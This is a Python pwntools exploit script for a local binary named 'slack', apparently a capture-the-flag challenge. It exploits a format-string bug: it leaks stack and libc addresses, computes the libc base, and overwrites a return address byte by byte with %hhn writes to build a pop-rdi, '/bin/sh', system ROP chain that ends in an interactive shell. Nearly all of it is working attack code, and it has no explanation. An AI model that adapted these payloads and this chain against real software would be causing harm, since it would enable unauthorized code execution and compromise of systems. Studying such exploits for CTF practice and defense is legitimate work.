from pwn import *

io = process("./slack")
elf = context.binary = ELF('./slack')
libc = elf.libc
# io = gdb.debug("./slack", '''
# ''')
context.log_level = 'debug' 
# def formatthingy(base, replacewith, tobereplaced):
#     test = str(hex(replacewith)[2:])
#     test2 = int(test[-4:-2], 16)
#     test3 = int(test[-6:-4], 16)
#     test4 = int(test[-8:-6], 16)
#     test5 = int(test[-10:-8], 16)
#     test6 = int(test[-12:-10], 16)
#     # test7 = int(test[-14:-12], 16)
#     # test8 = int(test[-16:-14], 16)
#     test = int(test[-2:], 16)
#     print(test)
#     print(test2)
#     print(test3)
#     print(test4)
#     print(test5)
#     print(test6)
#     l = [test, test2, test3, test4, test5, test6]
#     t = [0, 0, 0, 0, 0, 0]
#     sort = sorted(l)
#     print(sort)
#     for i in range(len(sort)):
#         for j in range(len(l)):
#             if l[j] == sort[i]:
#                 t[i] = j
#     for i in range(6):
#         print(l[t[i]])
#     x = "%00%0$hhn%00%0$hhn%{0}c%0$hhn%{1}c%0$hhn{2}c%0$hhn{3}c%0$hhn{4}c%0$hhn{5}c%0$hhn".format(l[t[0]], l[t[1]]-l[t[0]], l[t[2]]-l[t[1]], l[t[3]]-l[t[2]], l[t[4]]-l[t[3]], l[t[5]]-l[t[4]]).encode()
#     x += b'a'*(8-(len(x)%8))
#     offset = (len(x)//8)+base
#     for i in range(2):
#         payload = "%00%{6}$hhn%00%{7}$hhn%{0}c%{8}$hhn%{1}c%{9}$hhn%{2}c%{10}$hhn%{3}c%{11}$hhn%{4}c%{12}$hhn%{5}c%{13}$hhn".format(l[t[0]], l[t[1]]-l[t[0]], l[t[2]]-l[t[1]], l[t[3]]-l[t[2]], l[t[4]]-l[t[3]], l[t[5]]-l[t[4]], offset, offset+1, offset+2, offset+3, offset+4, offset+5, offset+6, offset+7).encode()
#         payload += b'a'*(8-(len(payload)%8))
#         offset = (len(payload)//8)+base
#     payload += p64(tobereplaced+6)
#     payload += p64(tobereplaced+7)
#     payload += p64(tobereplaced+t[0])
#     payload += p64(tobereplaced+t[1])
#     payload += p64(tobereplaced+t[2])
#     payload += p64(tobereplaced+t[3])
#     payload += p64(tobereplaced+t[4])
#     payload += p64(tobereplaced+t[5])
#     io.sendline(payload)

payload = b'%1$p.%9$p'
io.recvuntil("nal):")
io.sendline(payload)
io.recvuntil("You:")
stack_leak, diff, libc_leak = io.recvline().strip().decode().partition('.')
print("Stack leak: ", stack_leak)
print("Libc leak: ", libc_leak)
libc.address = int(libc_leak, 16) - 2229920
print("Libc base: ", hex(libc.address))
binsh = next(libc.search(b"/bin/sh"))
print("bin/sh: ", hex(binsh))
system = libc.sym['system']
ret2 = libc.address + 0x00000000000f99ab
pop_rdi = libc.address + 0x000000000002a3e5
print("System: ", hex(system))
print("rdi pop: ", hex(pop_rdi))
ret = int(stack_leak, 16) + 8600
io.recvuntil("al):")
var = int(stack_leak, 16)+8488
print("variable: ", hex(var))
print("ret: ", hex(ret))
print(int(str(hex(pop_rdi))[-2:], 16))
print(int(str(hex(pop_rdi))[-4:-2], 16))
print(int(str(hex(pop_rdi))[-6:-4], 16))
def AAA(gadget, ret, offset):
    for i in range(6):
        j = offset + i
        print(j)
        io.recvuntil("al):")
        io.sendline(f"%{int(str(hex(ret))[-2:], 16) + j}c%25$hhn")
        io.recvuntil("al):")
        if i == 0:
            io.sendline(f"%{int(str(hex(gadget))[-((i*2)+2):], 16)}c%55$hhn")
        else:
            io.sendline(f"%{int(str(hex(gadget))[-((i*2)+2):-(i*2)], 16)}c%55$hhn")


# lastbit = str(hex(var))[-2:]
# secondlastbit = str(hex(var))[-4:-2]
# print("LASTBIt TO OVERWRITE: ", lastbit)
# print("SECONDLASTBIt TO OVERWRITE: ", secondlastbit)
# io.send(b'%99c%86%hhnA')
# io.send(p64(0x3))
# formatthingy(14, pop_rdi, ret)
# io.sendline(fmtstr_payload(14, {ret : pop_rdi}))
io.send(f"%{int(str(hex(var))[-4:], 16) + 3}c%25$hn")
io.recvuntil("al):")
io.sendline("%255c%55$hnn")
io.recvuntil("al):")
io.send(f"%{int(str(hex(ret))[-4:], 16) + 3}c%25$hn")
AAA(pop_rdi, ret, 0)
AAA(binsh, ret, 8)
AAA(ret2, ret, 16)
AAA(system, ret, 24)
# io.recvuntil("al):")
# io.sendline(f"%{int(str(hex(ret))[-2:], 16)}c%25$hhn")
# io.recvuntil("al):")
# io.sendline(f"%{int(str(hex(pop_rdi))[-2:], 16)}c%55$hhn")
# io.recvuntil("al):")
# io.sendline(f"%{int(str(hex(ret))[-2:], 16) + 1}c%25$hhn")
# io.recvuntil("al):")
# io.sendline(f"%{int(str(hex(pop_rdi))[-4:-2], 16)}c%55$hhn")
# io.recvuntil("al):")
# io.sendline(f"%{int(str(hex(ret))[-2:], 16) + 2}c%25$hhn")
# io.recvuntil("al):")
# io.sendline(f"%{int(str(hex(pop_rdi))[-6:-4], 16)}c%55$hhn")
# io.recvuntil("al):")
# io.sendline(f"%{int(str(hex(ret))[-2:], 16) + 8}c%25$hhn")
# io.recvuntil("al):")
# io.sendline(f"%{int(str(hex(binsh))[-2:], 16)}c%55$hhn")
# io.recvuntil("al):")
# io.sendline(f"%{int(str(hex(ret))[-2:], 16) + 9}c%25$hhn")
# io.recvuntil("al):")
# io.sendline(f"%{int(str(hex(binsh))[-4:-2], 16)}c%55$hhn")
# io.recvuntil("al):")
# io.sendline(f"%{int(str(hex(ret))[-2:], 16) + 10}c%25$hhn")
# io.recvuntil("al):")
# io.sendline(f"%{int(str(hex(binsh))[-6:-4], 16)}c%55$hhn")
# io.recvuntil("al):")
# io.sendline(f"%{int(str(hex(ret))[-2:], 16) + 11}c%25$hhn")
# io.recvuntil("al):")
# io.sendline(f"%{int(str(hex(binsh))[-8:-6], 16)}c%55$hhn")
# io.recvuntil("al):")
# io.sendline(f"%{int(str(hex(ret))[-2:], 16) + 12}c%25$hhn")
# io.recvuntil("al):")
# io.sendline(f"%{int(str(hex(binsh))[-10:-8], 16)}c%55$hhn")
# io.recvuntil("al):")
# io.sendline(f"%{int(str(hex(ret))[-2:], 16) + 13}c%25$hhn")
# io.recvuntil("al):")
# io.sendline(f"%{int(str(hex(binsh))[-12:-10], 16)}c%55$hhn")
# io.recvuntil("al):")
# io.sendline(f"%{int(str(hex(ret))[-2:], 16) + 16}c%25$hhn")
# io.recvuntil("al):")
# io.sendline(f"%{int(str(hex(ret2))[-2:], 16)}c%55$hhn")
# io.recvuntil("al):")
# io.sendline(f"%{int(str(hex(ret))[-2:], 16) + 17}c%25$hhn")
# io.recvuntil("al):")
# io.sendline(f"%{int(str(hex(ret2))[-4:-2], 16)}c%55$hhn")
# io.recvuntil("al):")
# io.sendline(f"%{int(str(hex(ret))[-2:], 16) + 18}c%25$hhn")
# io.recvuntil("al):")
# io.sendline(f"%{int(str(hex(ret2))[-6:-4], 16)}c%55$hhn")
# io.recvuntil("al):")
# io.sendline(f"%{int(str(hex(ret))[-2:], 16) + 19}c%25$hhn")
# io.recvuntil("al):")
# io.sendline(f"%{int(str(hex(ret2))[-8:-6], 16)}c%55$hhn")
# io.recvuntil("al):")
# io.sendline(f"%{int(str(hex(ret))[-2:], 16) + 20}c%25$hhn")
# io.recvuntil("al):")
# io.sendline(f"%{int(str(hex(ret2))[-10:-8], 16)}c%55$hhn")
# io.recvuntil("al):")
# io.sendline(f"%{int(str(hex(ret))[-2:], 16) + 21}c%25$hhn")
# io.recvuntil("al):")
# io.sendline(f"%{int(str(hex(ret2))[-12:-10], 16)}c%55$hhn")
# io.recvuntil("al):")
# io.sendline(f"%{int(str(hex(ret))[-2:], 16) + 24}c%25$hhn")
# io.recvuntil("al):")
# io.sendline(f"%{int(str(hex(system))[-2:], 16)}c%55$hhn")
# io.recvuntil("al):")
# io.sendline(f"%{int(str(hex(ret))[-2:], 16) + 25}c%25$hhn")
# io.recvuntil("al):")
# io.sendline(f"%{int(str(hex(system))[-4:-2], 16)}c%55$hhn")
# io.recvuntil("al):")
# io.sendline(f"%{int(str(hex(ret))[-2:], 16) + 26}c%25$hhn")
# io.recvuntil("al):")
# io.sendline(f"%{int(str(hex(system))[-6:-4], 16)}c%55$hhn")
# io.recvuntil("al):")
# io.sendline(f"%{int(str(hex(ret))[-2:], 16) + 27}c%25$hhn")
# io.recvuntil("al):")
# io.sendline(f"%{int(str(hex(system))[-8:-6], 16)}c%55$hhn")
# io.recvuntil("al):")
# io.sendline(f"%{int(str(hex(ret))[-2:], 16) + 28}c%25$hhn")
# io.recvuntil("al):")
# io.sendline(f"%{int(str(hex(system))[-10:-8], 16)}c%55$hhn")
# io.recvuntil("al):")
# io.sendline(f"%{int(str(hex(ret))[-2:], 16) + 29}c%25$hhn")
# io.recvuntil("al):")
# io.sendline(f"%{int(str(hex(system))[-12:-10], 16)}c%55$hhn")
io.recvuntil("al):")
io.send(f"%{int(str(hex(var))[-4:], 16) + 3}c%25$hn")
io.recvuntil("al):")
io.sendline("%33c%55$hn")
# io.recvuntil("al):")
# io.send(f"%{int(str(hex(ret))[-16:-12], 16)}c%25$hn")
# payload += p64(int(stack_leak, 16)+9120)
# io.sendline(payload)
io.interactive()
'''
stack 1
libc 9
canary 19
'''